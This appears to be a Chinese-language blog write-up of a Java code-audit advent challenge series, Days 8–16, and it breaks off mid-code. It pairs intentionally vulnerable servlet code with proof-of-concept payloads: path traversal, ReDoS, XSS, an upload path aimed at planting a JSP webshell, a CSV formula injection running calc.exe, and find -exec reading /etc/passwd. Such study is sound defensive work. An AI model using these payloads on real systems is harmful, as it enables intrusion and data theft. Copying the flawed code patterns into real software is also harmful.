<h2 id="Day-8-Icicles"><a href="#Day-8-Icicles" class="headerlink" title="Day 8 - Icicles"></a>Day 8 - Icicles</h2><h3 id="Source-6"><a href="#Source-6" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetPath</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String icons = request.getParameter(<span class="string">"icons"</span>);</span><br><span class="line">      String filename = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line"></span><br><span class="line">      File f_icons = <span class="keyword">new</span> File(icons);</span><br><span class="line">      File f_filename = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!icons.equals(f_icons.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"File not within target directory!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!filename.equals(f_filename.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"File not within target directory!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String toDir = <span class="string">"/var/myapp/data/"</span> + f_icons.getName() + <span class="string">"/"</span>;</span><br><span class="line">      File file = <span class="keyword">new</span> File(toDir, filename);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Download file...</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>乍一看，像是目录穿越，任意文件下载。仔细一看代码利用icons.equals(f_icons.getName())进行了简单的防御。只获取了最后的文件名，似乎无法进行目录穿越。但是如果我们将icons赋值为..则可以跳到上级目录，就可以下载上级目录的文件了。</p>
<h3 id="防御措施：-1"><a href="#防御措施：-1" class="headerlink" title="防御措施："></a>防御措施：</h3><p>把..和/这些东西都过滤掉</p>
<h2 id="Day-9-Chestnuts"><a href="#Day-9-Chestnuts" class="headerlink" title="Day 9 - Chestnuts"></a>Day 9 - Chestnuts</h2><h3 id="Source-7"><a href="#Source-7" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Validator</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    response.setContentType(<span class="string">"text/plain"</span>);</span><br><span class="line">    response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">    PrintWriter out = response.getWriter();</span><br><span class="line">    <span class="keyword">if</span> (isInWhiteList(request.getParameter(<span class="string">"whitelist"</span>), request.getParameter(<span class="string">"value"</span>))) &#123;</span><br><span class="line">      out.print(<span class="string">"Value is in whitelist."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      out.print(<span class="string">"Value is not in whitelist."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    out.flush();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isInWhiteList</span><span class="params">(String whitelist, String value)</span> </span>&#123;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">"^["</span> + whitelist + <span class="string">"]+"</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(value);</span><br><span class="line">    <span class="keyword">return</span> matcher.matches();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个用户可以控制正则表达式和value的值，那么就可以传入一个很复杂的正则把cpu耗尽。这类漏洞称之为ReDoS.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whitelist=x]|((((a+)+)+)+)&amp;value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure></p>
<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><h3 id="Source-8"><a href="#Source-8" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/webdav"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">webdav</span><span class="params">(HttpServletResponse res, @RequestParam(<span class="string">"name"</span>)</span> String name) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    res.setContentType(<span class="string">"text/xml"</span>);</span><br><span class="line">    res.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">    PrintWriter pw = res.getWriter();</span><br><span class="line">    name = name.replace(<span class="string">"]]"</span>, <span class="string">""</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;person&gt;"</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;name&gt;&lt;![CDATA["</span> + name.replace(<span class="string">" "</span>,<span class="string">""</span>) + <span class="string">"]]&gt;&lt;/name&gt;"</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;/person&gt;"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>用户可以控制传入的name的值，进而控制输出的xml，代码进行了简单的过滤，但是可以构造xss。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = test] ]&gt;&lt;something%3Ascript%09xmlns%3Asomething%3D&quot;http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml&quot;&gt;alert(1)&lt;%2Fsomething%3Ascript&gt;&lt;![CDATA[</span><br></pre></td></tr></table></figure></p>
<p>经过测试，需要post方式提交，get方式是不行滴。</p>
<h3 id="防御措施-4"><a href="#防御措施-4" class="headerlink" title="防御措施:"></a>防御措施:</h3><p>过滤再过滤</p>
<h2 id="Day-11-Carolers"><a href="#Day-11-Carolers" class="headerlink" title="Day 11 - Carolers"></a>Day 11 - Carolers</h2><h3 id="Source-9"><a href="#Source-9" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.archivers.ArchiveStreamFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.archivers.tar.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtractFiles</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">extract</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// /tmp/uploaded.tar is user controlled and an uploaded file.</span></span><br><span class="line">    <span class="keyword">final</span> InputStream is = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"/tmp/uploaded.tar"</span>));</span><br><span class="line">    <span class="keyword">final</span> TarArchiveInputStream tarInputStream = (TarArchiveInputStream) (<span class="keyword">new</span> ArchiveStreamFactory().createArchiveInputStream(ArchiveStreamFactory.TAR, is));</span><br><span class="line">    File tmpDir = Files.createTempDirectory(<span class="string">"test"</span>).toFile();</span><br><span class="line">    TarArchiveEntry entry;</span><br><span class="line">    <span class="keyword">while</span> ((entry = tarInputStream.getNextTarEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      File file = <span class="keyword">new</span> File(tmpDir, entry.getName().replace(<span class="string">"../"</span>, <span class="string">""</span>));</span><br><span class="line">      <span class="keyword">if</span> (entry.isDirectory()) &#123;</span><br><span class="line">        file.mkdirs();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        IOUtils.copy(tarInputStream, <span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    is.close();</span><br><span class="line">    tarInputStream.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显 我们可以…/./来绕过过滤，进行目录穿越，进行写文件。</p>
<h3 id="防御措施-5"><a href="#防御措施-5" class="headerlink" title="防御措施:"></a>防御措施:</h3><p>过滤再过滤。先规范路径，然后判断是不是在相应目录下。</p>
<h2 id="Day-12-Evergreen"><a href="#Day-12-Evergreen" class="headerlink" title="Day 12 - Evergreen"></a>Day 12 - Evergreen</h2><h3 id="Source-10"><a href="#Source-10" class="headerlink" title="Source"></a>Source</h3><p>index.jsp<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.owasp.esapi.ESAPI"</span> %&gt;</span><br><span class="line">&lt;%! String customClass = <span class="string">"default"</span>; %&gt;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;%@ include file=<span class="string">"init.jsp"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"&lt;%= customClass %&gt;"</span>&gt;</span><br><span class="line">  &lt;%! String username; %&gt;</span><br><span class="line">  &lt;% username = request.getParameter(<span class="string">"username"</span>); %&gt;</span><br><span class="line">  Welcome citizen, you have been identified as</span><br><span class="line">  &lt;%</span><br><span class="line">    customClass = request.getParameter(<span class="string">"customClass"</span>);</span><br><span class="line">    customClass = ESAPI.encoder().encodeForHTML(customClass);</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"&lt;%= customClass %&gt;"</span>&gt;</span><br><span class="line">  &lt;%= ESAPI.encoder().encodeForHTML(username) %&gt;.</span><br><span class="line">&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>init.jsp<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% customClass = request.getParameter(<span class="string">"customClass"</span>); %&gt;</span><br></pre></td></tr></table></figure></p>
<p>一个很简单的变量覆盖.<br>poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /web_war_exploded/index.jsp HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=AEA1D4B900A1C3E88DAFEF5768769A31</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 57</span><br><span class="line"></span><br><span class="line">username=a&amp;customClass=&quot;&gt;&lt;/div&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施-6"><a href="#防御措施-6" class="headerlink" title="防御措施"></a>防御措施</h3><p>命名空间一定要规范好。</p>
<h2 id="Day-13-Epiphany"><a href="#Day-13-Epiphany" class="headerlink" title="Day 13 - Epiphany"></a>Day 13 - Epiphany</h2><h3 id="Source-11"><a href="#Source-11" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadFileController</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">    factory.setRepository(<span class="keyword">new</span> File(System.getProperty(<span class="string">"java.io.tmpdir"</span>)));</span><br><span class="line">    ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line"></span><br><span class="line">    String uploadPath = getServletContext().getRealPath(<span class="string">""</span>) + <span class="string">"upload"</span>;</span><br><span class="line">    File uploadDir = <span class="keyword">new</span> File(uploadPath);</span><br><span class="line">    <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">      uploadDir.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      List&lt;FileItem&gt; items = upload.parseRequest(request);</span><br><span class="line">      <span class="keyword">if</span> (items != <span class="keyword">null</span> &amp;&amp; items.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (FileItem item : items) &#123;</span><br><span class="line">          <span class="keyword">if</span> (!item.isFormField()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(item.getContentType().equals(<span class="string">"text/plain"</span>))) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"ContentType mismatch"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            String file = uploadPath + File.separator + item.getName();</span><br><span class="line">            File storeFile = <span class="keyword">new</span> File(file);</span><br><span class="line">            item.write(storeFile);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的跨越目录和任意文件上传.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;../../../hacked.jsp&quot;</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure></p>
<p>这样就可以直接传个jsp马上去.</p>
<h3 id="防御措施-7"><a href="#防御措施-7" class="headerlink" title="防御措施"></a>防御措施</h3><p>限制上传目录，限制文件类型.</p>
<h2 id="Day-14-Chimney"><a href="#Day-14-Chimney" class="headerlink" title="Day 14 - Chimney"></a>Day 14 - Chimney</h2><h3 id="Source-12"><a href="#Source-12" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Export</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    response.setContentType(<span class="string">"text/csv"</span>);</span><br><span class="line">    response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">    PrintWriter out = response.getWriter();</span><br><span class="line"></span><br><span class="line">    String content = buildCSV(request);</span><br><span class="line">    out.print(content);</span><br><span class="line">    out.flush();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">buildCSV</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">      StringBuilder str = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">      List&lt;List&lt;String&gt;&gt; rows = Arrays.asList(</span><br><span class="line">        Arrays.asList(<span class="string">"Scott"</span>, <span class="string">"editor"</span>, request.getParameter(<span class="string">"description"</span>))</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      str.append(<span class="string">"Name"</span>);</span><br><span class="line">      str.append(<span class="string">","</span>);</span><br><span class="line">      str.append(<span class="string">"Role"</span>);</span><br><span class="line">      str.append(<span class="string">","</span>);</span><br><span class="line">      str.append(<span class="string">"Description"</span>);</span><br><span class="line">      str.append(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (List&lt;String&gt; rowData : rows) &#123;</span><br><span class="line">        str.append(String.join(<span class="string">","</span>, rowData));</span><br><span class="line">        str.append(<span class="string">"\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> str.toString();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个CSV注入。可以在description变量处注入。然后ripstech说可以注入 excel的方程式，例如注入”=cmd|’/C calc.exe’!Z0”，然后在excel打开的时候，就可以调用系统命令，个人认为 利用条件过于苛刻。</p>
<h3 id="防御措施-8"><a href="#防御措施-8" class="headerlink" title="防御措施"></a>防御措施</h3><p>todo</p>
<h2 id="Day-15-Mistletoe"><a href="#Day-15-Mistletoe" class="headerlink" title="Day 15 - Mistletoe"></a>Day 15 - Mistletoe</h2><h3 id="Source-13"><a href="#Source-13" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindOnSystem</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String[] binary = &#123;<span class="string">"find"</span>, <span class="string">"."</span>, <span class="string">"-type"</span>, <span class="string">"d"</span>&#125;;</span><br><span class="line">      ArrayList&lt;String&gt; cmd = <span class="keyword">new</span> ArrayList&lt;&gt;(Arrays.asList(binary));</span><br><span class="line"></span><br><span class="line">      String[] options = request.getParameter(<span class="string">"options"</span>).split(<span class="string">" "</span>);</span><br><span class="line">      <span class="keyword">for</span> (String i : options) &#123;</span><br><span class="line">        cmd.add(i);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmd);</span><br><span class="line">      Process process = processBuilder.start();</span><br><span class="line">      IOUtils.copy(process.getInputStream(),response.getOutputStream());</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过options的参数可以进行命令注入，我原本以为可以通过类似”&amp;&amp;”之类的进行随便注入，后来发现不行，因为ProcessBuilder的参数如果是List类型，后边的值都会被认为是第一个命令的参数。所以我们需要find命令可以执行外部命令的参数,-exec可以。所以可以构造poc<br><code>?options=-exec cat /etc/passwd ;</code></p>
<h3 id="防御措施-9"><a href="#防御措施-9" class="headerlink" title="防御措施"></a>防御措施</h3><p>todo</p>
<h2 id="Day-16-Candles"><a href="#Day-16-Candles" class="headerlink" title="Day 16 - Candles"></a>Day 16 - Candles</h2><h3 id="Source-14"><a href="#Source-14" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@DynamicUpdate</span></span><br><span class="line"><span class="meta">@Table</span>(name = <span class="string">"UserEntity"</span>, uniqueConstraints = &#123;</span><br><span class="line">        <span class="meta">@UniqueConstraint</span>(columnNames = <span class="string">"ID"</span>),</span><br><span class="line">        <span class="meta">@UniqueConstraint</span>(columnNames = <span class="string">"EMAIL"</span>) &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserEntity</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">UserEntity</span><span class="params">(String email, String firstName, String lastName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.email = email;</span><br><span class="line">    <span class="keyword">this</span>.firstName = firstName;</span><br><span class="line">    <span class="keyword">this</span>.lastName = lastName;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">1798070786993154676L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Id</span></span><br><span class="line">  <span class="meta">@GeneratedValue</span>(strategy = GenerationType.IDENTITY)</span><br><span class="line">  <span class="meta">@Column</span>(name = <span class="string">"ID"</span>, unique = <span class="keyword">true</span>, nullable = <span class="keyword">false</span>)</span><br><span class="line">  <span class="keyword">private</span> Integer userId;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(name = <span class="string">"EMAIL"</span>, unique = <span class="keyword">true</span>, nullable = <span class="keyword">false</span>, length = <span class="number">100</span>)</span><br><span class="line">  <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(name = <span 